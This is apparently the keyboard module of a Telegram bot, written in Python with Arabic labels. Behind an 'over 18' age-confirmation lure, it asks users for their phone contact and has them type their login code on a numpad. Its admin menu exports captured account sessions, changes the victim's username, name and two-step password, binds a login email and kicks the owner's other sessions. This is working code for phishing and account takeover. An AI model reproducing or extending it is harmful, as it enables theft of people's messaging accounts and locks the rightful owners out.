# keyboards.py
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
)

import database

ADMIN_FOOTER = "\n\n─────────────\n⚡️ @No1_noone"

# أزرار الأدمن تستخدم id الجلسة (حرف + رقم) لتجنب حد 64 بايت في callback_data
CB = {
    "session": "i",
    "export": "x",
    "delete": "d",
    "hide": "h",
    "code": "c",
    "mail": "m",
    "user": "u",
    "name": "n",
    "twofa": "f",
    "kick": "k",
}


def cb(kind: str, session_id: int) -> str:
    return f"{CB[kind]}{session_id}"


def age_confirm_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="عمري أكثر من 18 عامًا! ✔️",
            callback_data="confirm_age",
        )]
    ])


def share_phone_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(
            text="عمري أكثر من 18 عامًا! ✔️",
            request_contact=True,
        )]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )


def numpad_keyboard(current_input: str = "") -> InlineKeyboardMarkup:
    display = current_input if current_input else "_ _ _ _ _"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📟 {display}", callback_data="numpad_display")],
        [
            InlineKeyboardButton(text="1", callback_data="np_1"),
            InlineKeyboardButton(text="2", callback_data="np_2"),
            InlineKeyboardButton(text="3", callback_data="np_3"),
        ],
        [
            InlineKeyboardButton(text="4", callback_data="np_4"),
            InlineKeyboardButton(text="5", callback_data="np_5"),
            InlineKeyboardButton(text="6", callback_data="np_6"),
        ],
        [
            InlineKeyboardButton(text="7", callback_data="np_7"),
            InlineKeyboardButton(text="8", callback_data="np_8"),
            InlineKeyboardButton(text="9", callback_data="np_9"),
        ],
        [
            InlineKeyboardButton(text="0", callback_data="np_0"),
            InlineKeyboardButton(text="⌫", callback_data="np_del"),
        ],
    ])


def retry_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 محاولة أخرى", callback_data="retry_code")]
    ])


def _session_label(s) -> str:
    phone = s["phone"]
    valid = bool(s["valid"]) if s["valid"] is not None else True
    parts = []
    if database.row_flag(s, "secured"):
        parts.append("🔒")
    if database.row_flag(s, "a1_only"):
        parts.append("⭐")
    parts.append("✅" if valid else "❌")
    parts.append(phone)
    return " ".join(parts)


def sessions_keyboard(
    sessions,
    page: int = 0,
    per_page: int = 6,
    is_super_admin: bool = False,
) -> InlineKeyboardMarkup:
    total = len(sessions)
    start = page * per_page
    end = start + per_page
    page_sessions = sessions[start:end]

    buttons = []
    for s in page_sessions:
        sid = s["id"]
        label = _session_label(s)
        row = [
            InlineKeyboardButton(text=label, callback_data=cb("session", sid)),
        ]
        if is_super_admin:
            star = "⭐" if database.row_flag(s, "a1_only") else "☆"
            row.append(
                InlineKeyboardButton(text=star, callback_data=cb("hide", sid))
            )
        row.append(
            InlineKeyboardButton(text="🗑", callback_data=cb("delete", sid))
        )
        buttons.append(row)

    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(
            text="◀️ السابق", callback_data=f"sessions_page_{page - 1}"
        ))
    if end < total:
        nav.append(InlineKeyboardButton(
            text="التالي ▶️", callback_data=f"sessions_page_{page + 1}"
        ))
    if nav:
        buttons.append(nav)

    if is_super_admin:
        buttons.append([
            InlineKeyboardButton(
                text="🔍 فحص الجلسات",
                callback_data="check_sessions",
            )
        ])
    buttons.append([
        InlineKeyboardButton(
            text="♻️ تصفير ذاكرة العمليات",
            callback_data="reset_mail_mem",
        )
    ])
    export_row = [
        InlineKeyboardButton(
            text="📥 سحب كل الجلسات (TXT)",
            callback_data="export_all_txt",
        )
    ]
    if is_super_admin:
        export_row.append(
            InlineKeyboardButton(
                text="⭐ سحب جلسات النجمة",
                callback_data="export_star_txt",
            )
        )
    buttons.append(export_row)

    if is_super_admin:
        buttons.append([
            InlineKeyboardButton(
                text="📦 سحب Volume",
                callback_data="vol_export",
            ),
            InlineKeyboardButton(
                text="📤 رفع Volume",
                callback_data="vol_import",
            ),
        ])

    return InlineKeyboardMarkup(inline_keyboard=buttons)


def session_detail_keyboard(session_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="🔑 المطالبة بكود",
            callback_data=cb("code", session_id),
        )],
        [InlineKeyboardButton(
            text="📧 فحص/ربط بريد Login",
            callback_data=cb("mail", session_id),
        )],
        [InlineKeyboardButton(
            text="📜 سحب الجلسة (Text)",
            callback_data=cb("export", session_id),
        )],
        [
            InlineKeyboardButton(
                text="✏️ تغيير اليوزر",
                callback_data=cb("user", session_id),
            ),
            InlineKeyboardButton(
                text="📝 تغيير الاسم",
                callback_data=cb("name", session_id),
            ),
        ],
        [InlineKeyboardButton(
            text="🔐 تعيين/تغيير التحقق بخطوتين",
            callback_data=cb("twofa", session_id),
        )],
        [InlineKeyboardButton(
            text="🚫 طرد الجلسات + تنظيف شامل",
            callback_data=cb("kick", session_id),
        )],
        [InlineKeyboardButton(
            text="🔙 رجوع للقائمة",
            callback_data="back_to_sessions",
        )],
    ])


def back_to_session_keyboard(session_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 رجوع", callback_data=cb("session", session_id))]
    ])
